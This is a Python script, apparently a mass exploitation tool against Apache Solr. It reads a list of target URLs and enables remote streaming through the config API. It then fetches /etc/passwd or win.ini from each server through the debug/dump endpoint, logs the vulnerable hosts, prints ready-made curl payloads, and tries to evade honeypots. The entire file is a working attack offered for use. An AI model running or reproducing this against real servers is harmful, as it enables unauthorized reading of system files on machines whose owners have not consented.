import requests
import sys,re,json
import threadpool
#from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings()

banner = '''
   _____       _        _____                _ 
  / ____|     | |      |  __ \              | |
 | (___   ___ | |_ __  | |__) |___  __ _  __| |
  \___ \ / _ \| | '__| |  _  // _ \/ _` |/ _` |
  ____) | (_) | | |    | | \ \  __/ (_| | (_| |
 |_____/ \___/|_|_|    |_|  \_\___|\__,_|\__,_|
                                               
                            by 斯文            
'''

def exp(url):

    try:
        dbName = getDb(url)
        
        if dbName:

            session = requests.Session()
            rawBody = "{  \"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}"
            headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Content-type":"application/json","Accept":"*/*"}
            response = session.post("{}/solr/{}/config".format(url,dbName), data=rawBody, headers=headers)
            session.close()

            with open('ScanResult.txt',"a") as f:
                linux = linuxFile(url,dbName)
                if 'root:x:0:0:' in linux:
                    exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:////etc/passwd" '.format(url,dbName)
                    print("[+ !vul  Payload: {}".format(exp))
                    f.write(url+"\n")
                    return True

                win = windowsFile(url,dbName)
                if 'extensions' in win:
                    exp = 'curl "{}/solr/{}/debug/dump?param=ContentStreams" -F "stream.url=file:///C:windows/win.ini" '.format(url,dbName)
                    print("[+ !vul Payload: {}".format(exp))
                    f.write(url+"\n")
                    return True

    except Exception as httperror:
        print("Not vul")

def linuxFile(url,dbName):

    session = requests.Session()
    paramsGet = {"param":"ContentStreams"}
    paramsPost = {"stream.url":"file:////etc/passwd"}
    headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Accept":"*/*"}
    response = session.post("{}/solr/{}/debug/dump".format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)
    session.close()

    return str(response.content)

def windowsFile(url,dbName):

    session = requests.Session()
    paramsGet = {"param":"ContentStreams"}
    paramsPost = {"stream.url":"file:///c:windows/win.ini"}
    headers = {"User-Agent":"hack by sskkaayy","Connection":"close","Accept":"*/*"}
    response = session.post("{}/solr/{}/debug/dump".format(url,dbName), data=paramsPost, params=paramsGet, headers=headers)
    session.close()

    return str(response.content)


def getDb(url):

    try:
        target = url + '/solr/admin/cores?action=STATUS'
        response = requests.get(target,verify=False,timeout=20)
        data = response.text

        if '关于全网部署360私有云的通知' in data:
            print('[- 蜜罐烦死啦!')
            return False

        try:
            r = re.compile('''"status":{
    "(.*?)":{''')
            Str = re.findall(r,str(data))
            dbName = Str[0]
        except:
            r = re.compile('''<str name="name">(.*?)</str>''')
            Str = re.findall(r,str(data))
            dbName = Str[0]

    except Exception as e:
        return False

    return dbName

def multithreading(funcname, params=[], filename="ip.txt", pools=5):
    works = []
    with open(filename, "r") as f:
        for i in f:
            func_params = [i.rstrip("\n")] + params

            works.append((func_params, None))
    pool = threadpool.ThreadPool(pools)
    reqs = threadpool.makeRequests(funcname, works)

    [pool.putRequest(req) for req in reqs]
    pool.wait()

def main():
    multithreading(exp, [], "url.txt", 20)  # 默认15线程
    print("全部check完毕，请查看当前目录下的ScanResult.txt")

            
if __name__ == "__main__":
    print(banner)
    main()